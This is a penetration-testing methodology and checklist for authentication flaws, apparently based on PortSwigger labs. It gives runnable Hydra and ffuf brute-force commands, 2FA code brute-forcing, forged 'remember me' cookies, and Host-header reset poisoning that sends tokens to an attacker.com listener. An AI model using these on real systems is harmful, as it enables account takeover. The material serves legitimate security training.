# Authentication Vulnerabilities Methodology, Tricks & Checklist

> **Source:** PortSwigger Web Security Academy

---

## 1. Methodology — Where to Start

When you find a login page, test **everything** around it, not just the login form itself. Auth vulns live in the surrounding features:

| Entry Point | What to Test |
|---|---|
| Login Page | Username enumeration, brute-force, lockout bypass |
| Registration | Username policy, email leaks, weak validation |
| 2FA / MFA | Bypass, flawed logic, brute-forceable codes |
| "Remember Me" | Predictable cookie, weak encoding, hash cracking |
| Password Reset | Token leaks, host header poisoning, logic flaws |
| Password Change | Hidden username field, brute-force via change form |

---

## 2. Username Enumeration

**Why it matters:** Knowing a valid username cuts your brute-force work in half. You go from `username × password` combinations to just password guessing.

**Where to find usernames:**
- Public profiles (even if content hidden, the URL/username may be visible)
- HTTP responses that leak email addresses
- Registration page ("username already taken")
- Login error messages that differ between "invalid user" vs "wrong password"

### Signal 1 — Status Codes

Most failed logins return the same code (200 or 302). A **different code** for one username = that username exists.

> Burp Intruder → Payloads = username wordlist → Sort results by Status Code → anomaly = valid username

### Signal 2 — Error Messages

`"Invalid username"` vs `"Incorrect password"` = enumeration. Even a single character difference counts (extra space, period, typo).

> Burp Intruder → Payloads = username wordlist → Grep Extract → pull the error message text → Sort → find the one that differs

### Signal 3 — Response Times

If the app only checks the password when the username is valid, valid usernames take slightly longer to respond.

> **Trick:** Send an extremely long password (200+ chars) to amplify the timing difference. Valid username = server spends time hashing the long password. Invalid username = instant reject.

> Burp Intruder → Payloads = username wordlist → Columns → add "Response received" and "Response completed" → Sort by time → outlier = valid username

### Commands

```bash
# ffuf username enumeration via response size
ffuf -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
     -u "https://target.com/login" \
     -X POST \
     -d "username=FUZZ&password=invalidpassword123" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -fs <common_fail_size>

# Hydra username enumeration (grep for different error)
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
      -p fakepassword target.com http-post-form \
      "/login:username=^USER^&password=^PASS^:Invalid username"
```

---

## 3. Password Brute-Force

**Why humans are predictable:** Password policies force patterns. Users don't create random strings — they modify existing words to fit rules:

```
mypassword → Mypassword1! → Myp4$$w0rd
When forced to change: Mypassword1! → Mypassword2! → Mypassword1?
```

This means targeted wordlists beat raw brute-force every time.

### Commands

```bash
# Hydra — basic login brute-force (POST form)
hydra -l <username> -P /usr/share/wordlists/rockyou.txt \
      target.com http-post-form \
      "/login:username=^USER^&password=^PASS^:Invalid password"

# ffuf — POST form brute-force
ffuf -w /usr/share/wordlists/rockyou.txt \
     -u "https://target.com/login" \
     -X POST \
     -d "username=admin&password=FUZZ" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -fs <fail_size>

# Hydra — GET form (like DVWA)
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
      target.com http-get-form \
      "/login:username=^USER^&password=^PASS^:F=incorrect:H=Cookie: session=abc123"

# Burp Intruder — Sniper attack
# Mark password field as payload position
# Load wordlist
# Sort results by Status Code + Response Length
```

---

## 4. Brute-Force Protection Bypass

### IP-Based Blocking

**Protection:** Block IP after X failed attempts.

**Bypass:** Some apps reset the fail counter on a **successful** login. Interleave your own valid creds every few attempts:

```
admin:password1
admin:password2
YOUR_USER:YOUR_PASS     ← resets the counter
admin:password3
admin:password4
YOUR_USER:YOUR_PASS     ← resets again
```

> Burp Intruder → **Pitchfork** attack type
> Payload 1 = alternating `target_user` / `your_user`
> Payload 2 = alternating `password_guess` / `your_password`

Also check for header spoofing:
- `X-Forwarded-For: <rotated IP>`
- `X-Real-IP`
- `X-Originating-IP`

### Account Locking

**Protection:** Lock account after X failed attempts.

**Trick 1 — Enumerate via lockout:**
If `"account locked"` appears for one username but `"invalid credentials"` for others → that username exists AND you know the lockout threshold.

**Trick 2 — Password spray instead of brute-force:**
Instead of `1 user × 10000 passwords` (triggers lockout), do `1000 users × 3 passwords` (stays under threshold).

Pick 3 passwords most likely to be used:
```
Password1!
Welcome1!
<CompanyName>2024!
```

Try each password against ALL usernames. Only need ONE user to have used one of those 3.

**Trick 3 — Credential stuffing:**
Use leaked `username:password` pairs from breaches. Each username attempted only once = no lockout triggered. Works because people reuse passwords across sites.

### Rate Limiting

**Bypass attempts:**
- Slow down requests (`-p 1.0` in ffuf)
- Multiple passwords in a single request (if app accepts arrays)
- IP rotation via `X-Forwarded-For`
- Distribute across multiple IPs (proxychains, VPN rotation)

---

## 5. HTTP Basic Authentication

**How it works:** Browser sends credentials in every request as:
```
Authorization: Basic base64(username:password)
```

**Why it's weak:**
- Credentials sent with EVERY request (interceptable without HTTPS)
- Token is static (base64 encoded, trivially decoded)
- Usually no brute-force protection
- No CSRF protection built in
- Credentials often reused on other endpoints

### Commands

```bash
# Decode the token
echo "YWRtaW46cGFzc3dvcmQ=" | base64 -d
# Output: admin:password

# Brute-force HTTP Basic Auth with Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
      target.com http-get / -s 80
```

> Always try decoded creds against SSH, other login forms, databases.

---

## 6. Two-Factor Authentication (2FA) Bypass

### Technique 1 — Skip the 2FA Page Entirely

After entering valid username+password (step 1), the app may consider you "logged in" before you complete step 2.

**Test:** After step 1 login succeeds, instead of following the redirect to the 2FA code page, manually navigate to:
- `/my-account`
- `/dashboard`
- `/profile`
- `/admin`

If the page loads → 2FA is not enforced, just presented.

### Technique 2 — Flawed Verification Logic (Cookie Swap)

The app uses a cookie or parameter to track **whose** 2FA code to verify. You can swap it to another user:

```
Normal flow:
  POST /login         → username=you&password=yourpass
  Response:            Set-Cookie: account=you
  GET /login/step2     Cookie: account=you
  POST /login/step2    Cookie: account=you  code=123456

Attack:
  POST /login         → username=you&password=yourpass
  Response:            Set-Cookie: account=you
  GET /login/step2     Cookie: account=VICTIM    ← change this
  POST /login/step2    Cookie: account=VICTIM    ← and this
                       code=<brute-force 0000-9999>
```

The app generates and checks a code for **VICTIM**, not you. Brute-force the 4-6 digit code = access victim's account without ever knowing their password.

```bash
# Generate 4-digit code list
seq -w 0000 9999 > codes.txt

# Generate 6-digit code list
seq -w 000000 999999 > codes.txt

# ffuf brute-force 2FA
ffuf -w codes.txt \
     -u "https://target.com/login/step2" \
     -X POST \
     -d "code=FUZZ" \
     -H "Cookie: account=victim; session=abc123" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -fs <fail_size>
```

### Technique 3 — Brute-Force Despite Logout

Some apps auto-logout after X incorrect 2FA attempts.

**Bypass:** Automate the full cycle:
1. Login with valid creds
2. Get new session
3. Try one 2FA code
4. If wrong, repeat from step 1

> Use Burp Macros or Turbo Intruder to automate this loop. Each attempt uses a fresh session = logout protection is useless.

### Technique 4 — 2FA Code Reuse

After using a valid 2FA code, check if the same code works again. Some apps don't invalidate used codes.

### Technique 5 — 2FA Code in Response

Check the response after requesting a 2FA code. Sometimes the code is leaked in the response body, headers, or a JSON field (especially in mobile API endpoints).

---

## 7. "Remember Me" / Stay Logged In Cookie

**How it works:** App sets a persistent cookie so user stays logged in. The cookie value **IS** the authentication — anyone with the cookie bypasses the login entirely.

### Common Weak Implementations

```
cookie = base64(username:md5(password))
cookie = base64(username:timestamp)
cookie = base64(username:sha1(password))
cookie = md5(username + password)
```

### Testing Methodology

1. Create your own account
2. Check the "Remember me" / "Stay logged in" box
3. Log in and inspect the cookie:

```bash
echo "<cookie_value>" | base64 -d
# Output might be: admin:5f4dcc3b5aa765d61d8327deb882cf99
# That's username:md5(password)
```

4. If you can reverse the formula from your own cookie, forge cookies for other users:

```bash
# Crack the hash or build it from a known password
echo -n "password" | md5sum
# 5f4dcc3b5aa765d61d8327deb882cf99

# Forge cookie for victim
echo -n "admin:5f4dcc3b5aa765d61d8327deb882cf99" | base64
# Set this as your cookie → logged in as admin
```

5. If you can't crack the hash, brute-force the cookie:

```bash
# Create a wordlist of hashed passwords
while read pass; do
    hash=$(echo -n "$pass" | md5sum | cut -d' ' -f1)
    cookie=$(echo -n "carlos:$hash" | base64)
    echo "$cookie"
done < /usr/share/wordlists/rockyou.txt > cookie_wordlist.txt

# ffuf brute-force the cookie
ffuf -w cookie_wordlist.txt \
     -u "https://target.com/my-account" \
     -H "Cookie: stay-logged-in=FUZZ" \
     -fs <logged_out_size>
```

6. If XSS exists anywhere on the app → steal the remember-me cookie via XSS since it persists across sessions.

> **Gotcha:** No brute-force protection on cookie-based login is common. The app rate-limits the login form but forgets to limit direct cookie authentication. Always test both paths.

---

## 8. Password Reset Vulnerabilities

### Password Sent via Email

If the app emails a new password in plaintext:
- Intercept if no TLS (MITM)
- Email is persistent storage = password sits in inbox forever
- Email syncs across devices on insecure channels

### Predictable Reset URL

**Weak:** `/reset-password?user=carlos`

**Test:** Change `?user=carlos` to `?user=admin` → does it let you reset admin's password?

### Token Validation Flaw

Check:
- Is the token validated when the reset form is **submitted**? (some apps validate on page load but not on form submit)
- Delete the token parameter entirely from the POST request
- Change the username in a hidden field while keeping a valid token

**Test flow:**
1. Request password reset for YOUR account
2. Intercept the reset link, note the token
3. Load the reset page with the token (validates)
4. When submitting the new password form, **change the username parameter** to the victim's username
5. If no server-side token re-validation → victim's password changed

### Password Reset Poisoning (Host Header)

If the reset URL is built using the Host header:

```http
POST /forgot-password HTTP/1.1
Host: attacker.com              ← poisoned
...
username=victim
```

The app generates a reset link using the Host header:
```
https://attacker.com/reset?token=abc123
```

This link gets emailed to the victim. If they click it, the token goes to **your** server.

Also try:
- `X-Forwarded-Host: attacker.com`
- `X-Host: attacker.com`
- `Forwarded: host=attacker.com`
- Double Host header trick:
  ```
  Host: legitimate-site.com
  Host: attacker.com
  ```

```bash
# Set up a listener to capture the token
python3 -m http.server 80
# or
nc -lvnp 80

# Check for incoming request with token
# GET /reset?token=abc123
```

---

## 9. Password Change Functionality

### Hidden Username Field

Intercept the password change request. Look for a hidden `username` field in the POST body. Change it to victim's username → change their password instead.

### Brute-Force via Change Form

The password change form often has **different** error messages:
- `"Current password is incorrect"`
- `"New passwords do not match"`

If the app tells you the current password is wrong, you can brute-force the current password through this form (which may not have the same rate limiting as the login page).

### Logic Flaw in Validation

If new password and confirm password don't match, does the app still check the current password? This can leak whether a password guess was correct even though the change fails for a different reason.

---

## 10. Commands Quick Reference

```bash
# Username enumeration — ffuf
ffuf -w usernames.txt -u "https://target/login" -X POST \
     -d "username=FUZZ&password=fake" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -fs <fail_size>

# Password brute-force — ffuf
ffuf -w passwords.txt -u "https://target/login" -X POST \
     -d "username=admin&password=FUZZ" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -fs <fail_size>

# Hydra — POST form
hydra -l admin -P rockyou.txt target http-post-form \
      "/login:username=^USER^&password=^PASS^:F=incorrect:H=Cookie: s=abc"

# Hydra — GET form (DVWA style)
hydra -l admin -P rockyou.txt target http-get-form \
      "/login:username=^USER^&password=^PASS^:F=incorrect:H=Cookie: s=abc"

# Hydra — HTTP Basic Auth
hydra -l admin -P rockyou.txt target http-get /

# 2FA code generation
seq -w 0000 9999 > 4digit.txt
seq -w 000000 999999 > 6digit.txt

# Decode base64 cookie
echo "Y2FybG9zOjVmNGRjYzNi..." | base64 -d

# Generate md5 hash
echo -n "password" | md5sum | cut -d' ' -f1

# Forge remember-me cookie
echo -n "admin:$(echo -n 'password' | md5sum | cut -d' ' -f1)" | base64
```

---

## 11. Master Checklist — Test Everything

### Login Page

- [ ] Test for username enumeration (different error messages)
- [ ] Test for username enumeration (different status codes)
- [ ] Test for username enumeration (response timing with long password)
- [ ] Brute-force password for confirmed username
- [ ] Check for account lockout — note the threshold
- [ ] If lockout exists — use it to enumerate usernames
- [ ] If lockout exists — password spray (few passwords, many users)
- [ ] If IP blocking — interleave own valid login to reset counter
- [ ] If IP blocking — try X-Forwarded-For header spoofing
- [ ] Check for HTTP Basic Auth (Authorization: Basic header)
- [ ] Decode any base64 tokens in Authorization or Cookie headers
- [ ] Test rate limiting — does slowing down bypass it?
- [ ] Try credential stuffing with known breach lists

### 2FA / MFA

- [ ] After step 1 login, try navigating directly to `/my-account`
- [ ] Check if 2FA page uses a cookie to identify the user
- [ ] Swap that cookie to victim's username, brute-force the code
- [ ] Check if 2FA code appears in any response body/header
- [ ] Test if used codes can be reused
- [ ] If auto-logout on wrong code — automate login+code cycle
- [ ] Check if 2FA applies to all auth paths (API, mobile, etc.)

### Remember Me / Stay Logged In

- [ ] Enable "remember me", inspect the cookie value
- [ ] Base64 decode the cookie — identify the formula
- [ ] Check if it contains username + hashed password
- [ ] If yes — forge cookies for other users
- [ ] If hash is unsalted — crack via CrackStation or hashcat
- [ ] Brute-force cookie values if formula is known
- [ ] Check if cookie brute-force has rate limiting (often doesn't)
- [ ] XSS + steal persistent remember-me cookie = account takeover

### Password Reset

- [ ] Request reset for your account — inspect the reset URL/token
- [ ] Check if token is predictable or sequential
- [ ] Change username param in reset URL — does it reset another user?
- [ ] Submit reset form without the token — does it still work?
- [ ] Change username in POST body when submitting new password
- [ ] Test Host header poisoning (`Host: attacker.com`)
- [ ] Test X-Forwarded-Host header poisoning
- [ ] Check if reset token expires (reuse an old one)
- [ ] Check if reset token is single-use (use it twice)

### Password Change

- [ ] Intercept change-password request — look for username field
- [ ] Change hidden username to victim — does it change their password?
- [ ] Compare error messages: "wrong current password" vs "passwords don't match"
- [ ] Brute-force current password through the change form
- [ ] Check if change form has different rate limiting than login

### General

- [ ] Check all auth-related responses for information leakage
- [ ] Test all auth endpoints with and without cookies/sessions
- [ ] Try accessing authenticated pages without any session at all
- [ ] Check if API endpoints have different auth than web UI
- [ ] Test password complexity — does it accept weak passwords?
- [ ] Check session management — does logout actually invalidate session?
- [ ] Try session fixation — can you set someone else's session ID?
